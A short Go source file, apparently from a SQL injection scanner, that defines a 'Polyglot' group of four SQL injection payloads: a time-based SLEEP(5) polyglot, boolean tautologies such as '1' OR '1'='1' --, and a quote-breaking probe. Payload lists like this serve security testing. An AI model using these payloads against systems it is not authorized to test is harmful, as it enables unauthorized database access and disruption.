package payloads

var Polyglot = PayloadGroup{
	DBMS: "Polyglot",
	Payloads: []Payload{
		{Type: "error", Content: "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/"},
		{Type: "boolean", Content: "1' OR '1'='1' --"},
		{Type: "error", Content: "'\"`--"},
		{Type: "error", Content: "')) OR ((('1'='1"},
	},
}
